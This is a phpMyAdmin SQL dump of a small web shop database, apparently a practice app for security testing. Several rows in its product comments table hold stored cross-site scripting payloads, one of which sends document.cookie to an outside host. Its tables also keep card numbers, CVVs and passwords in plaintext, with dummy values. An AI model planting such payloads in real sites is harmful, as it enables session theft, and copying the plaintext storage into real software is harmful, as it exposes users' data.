-- phpMyAdmin SQL Dump
-- version 4.1.8
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: May 04, 2014 at 10:56 PM
-- Server version: 5.6.16
-- PHP Version: 5.4.24

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `am2`
--

-- --------------------------------------------------------

--
-- Table structure for table `product`
--

CREATE TABLE IF NOT EXISTS `product` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL,
  `picurl` varchar(100) NOT NULL,
  `price` int(10) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=21 ;

--
-- Dumping data for table `product`
--

INSERT INTO `product` (`id`, `name`, `picurl`, `price`) VALUES
(1, 'black phone case', '4.jpg', 15),
(2, 'black android case', '5.jpg', 12),
(3, 'Jack Reacher Blu-Ray Disc', '1.jpg', 50),
(4, '007 skyfall dvd', '2.jpg', 20),
(5, 'guilt trip dvd', '3.jpg', 15),
(6, 'brother printer', '6.jpg', 130),
(7, 'canon projector', '7.jpg', 495),
(8, 'hitachi blender', '8.jpg', 60),
(9, 'computer cable', '9.jpg', 15),
(10, 'mouse & keyboard combo', '10.jpg', 29),
(11, 'keningston laptop lock', '11.jpg', 60),
(12, 'atok power adaptor', '12.jpg', 35),
(13, 'samsong smart watch', '13.jpg', 139),
(14, 'apple laptop stand', '14.jpg', 149),
(15, 'computer cabinet', '15.jpg', 265),
(16, 'plier tool set', '16.jpg', 69),
(17, 'artist record mic', '17.jpg', 159),
(18, 'learner guitar', '18.jpg', 116),
(19, 'casual watch', '19.jpg', 249),
(20, 'casio watch', '20.jpg', 160);

-- --------------------------------------------------------

--
-- Table structure for table `product_comments`
--

CREATE TABLE IF NOT EXISTS `product_comments` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `productid` int(10) NOT NULL,
  `email` varchar(100) NOT NULL,
  `comment` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=11 ;

--
-- Dumping data for table `product_comments`
--

INSERT INTO `product_comments` (`id`, `productid`, `email`, `comment`) VALUES
(1, 3, 'df', 'sdf'),
(2, 8, 'sdf', 'sdf'),
(3, 8, 'kksd', 'okay buy it now'),
(4, 11, 'keku', 'meku meku'),
(5, 11, '', ''),
(6, 11, 'nana', '%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%68%69%22%29%3C%2F%73%63%72%69%70%74%3E'),
(7, 11, 'df', '<script>alert("hi")</script>'),
(8, 11, 'df', '<script>alert("hi")</script>'),
(9, 3, '', '<script>new Image().src="http://good.site/iamgood/showimage.php?"+document.cookie</script>'),
(10, 3, '', '');

-- --------------------------------------------------------

--
-- Table structure for table `transaction`
--

CREATE TABLE IF NOT EXISTS `transaction` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `uid` varchar(100) NOT NULL,
  `prodid` int(10) NOT NULL,
  `timedate` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `ccnumber` varchar(32) NOT NULL,
  `cvvnumber` varchar(10) NOT NULL,
  `expiry` varchar(10) NOT NULL,
  `qty` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
-- Dumping data for table `transaction`
--

INSERT INTO `transaction` (`id`, `uid`, `prodid`, `timedate`, `ccnumber`, `cvvnumber`, `expiry`, `qty`) VALUES
(1, 'kk@kk.two', 5, '2014-05-04 22:01:31', '1231231231234455', '123', '04/21/2019', 3),
(2, 'kk@kk.two', 5, '2014-05-04 22:01:47', '1231231231234455', '123', '04/21/2019', 3),
(3, 'kk@kk.two', 5, '2014-05-04 22:02:20', '1231231231234455', '123', '04/21/2019', 3);

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE IF NOT EXISTS `users` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `email` varchar(50) NOT NULL,
  `passwd` varchar(50) NOT NULL,
  `level` int(2) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `email`, `passwd`, `level`) VALUES
(1, 'kk@kk.two', 'kaka', 1),
(2, 'mm@mm.two', 'mama', 10);

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
